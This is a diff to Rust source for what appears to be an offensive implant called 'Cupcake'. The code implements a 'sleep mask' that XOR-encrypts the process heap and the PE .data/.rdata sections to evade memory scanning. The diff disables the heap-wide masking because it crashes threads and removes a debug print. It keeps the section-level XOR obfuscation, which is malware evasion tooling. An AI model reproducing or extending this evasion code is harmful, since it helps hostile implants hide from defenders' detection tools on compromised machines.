@@ -19,22 +19,10 @@ pub unsafe fn mask_heap(h_heap: HANDLE, mask: u8) {
     }
 }
 
-/// 🛡️ Phase 2: Mask the entire default process heap
-/// Uses a multi-byte XOR key for more robust obfuscation
-pub unsafe fn mask_default_heap(xor_key: &[u8]) {
-    use winapi::um::heapapi::GetProcessHeap;
-    let h_heap = GetProcessHeap();
-    if !h_heap.is_null() {
-        let mut entry: PROCESS_HEAP_ENTRY = std::mem::zeroed();
-        while winapi::um::heapapi::HeapWalk(h_heap, &mut entry) != 0 {
-            if (entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0 {
-                let data = std::slice::from_raw_parts_mut(entry.lpData as *mut u8, entry.cbData as usize);
-                for (i, b) in data.iter_mut().enumerate() {
-                    *b ^= xor_key[i % xor_key.len()];
-                }
-            }
-        }
-    }
+/// Full-process-heap XOR is **unsafe** with concurrent threads (tokio/runtime).
+/// Kept as a no-op stub so old call sites compile; do not re-enable without freezing all threads.
+pub unsafe fn mask_default_heap(_xor_key: &[u8]) {
+    // Intentionally disabled: HeapWalk + XOR of live heap causes random crashes.
 }
 
 /// 🛡️ Phase 2: Find and XOR-encrypt the .data and .rdata sections
@@ -85,7 +73,7 @@ unsafe fn shift_jis_const_xor(image_base: *const u8, xor_key: &[u8]) {
 
     for i in 0..section_count {
         let section = section_header.add(i as usize);
-        let name = &(*section).Name;
+        let _name = &(*section).Name;
 
         // Check if this section name matches any target
         let should_mask = target_names.iter().any(|&target| {
@@ -112,10 +100,6 @@ unsafe fn shift_jis_const_xor(image_base: *const u8, xor_key: &[u8]) {
             *b ^= xor_key[j % xor_key.len()];
         }
 
-        crate::utils::db_print(&format!(
-            "[Cupcake] Sleep mask: XOR'd section at 0x{:X} ({} bytes)",
-            section_addr as usize,
-            section_size
-        ));
+        let _ = (section_addr, section_size);
     }
 }
